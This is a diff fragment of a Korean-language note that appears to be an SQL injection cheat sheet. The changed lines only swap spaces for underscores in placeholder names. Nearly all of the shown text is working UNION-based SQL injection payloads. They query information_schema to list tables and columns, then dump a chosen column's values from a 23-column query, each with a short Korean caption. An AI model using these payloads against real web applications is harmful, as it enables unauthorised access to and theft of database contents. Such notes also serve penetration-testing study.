@@ -19,10 +19,10 @@ aa' union select 1,2,3,4,5,6,7,8,9,10,table_name,12,13,14,15,16,17,18,19,20,21,2
 * * *
 찾을 테이블의 이름을 넣어서 테이블의 컬럼들을 출력한다.
 ```
-aa' union select 1,2,3,4,5,6,7,8,9,10,column_name,12,13,14,15,16,17,18,19,20,21,22,23 from information_schema.columns where table_name='테이블 이름' #
+aa' union select 1,2,3,4,5,6,7,8,9,10,column_name,12,13,14,15,16,17,18,19,20,21,22,23 from information_schema.columns where table_name='테이블_이름' #
 ```
 * * *
 컬럼 값을 출력한다.
 ```
-aa' union select 1,2,3,4,5,6,7,8,9,10,컬럼 이름,12,13,14,15,16,17,18,19,20,21,22,23 from 테이블 이름 #
+aa' union select 1,2,3,4,5,6,7,8,9,10,컬럼_이름,12,13,14,15,16,17,18,19,20,21,22,23 from 테이블_이름 #
 ```
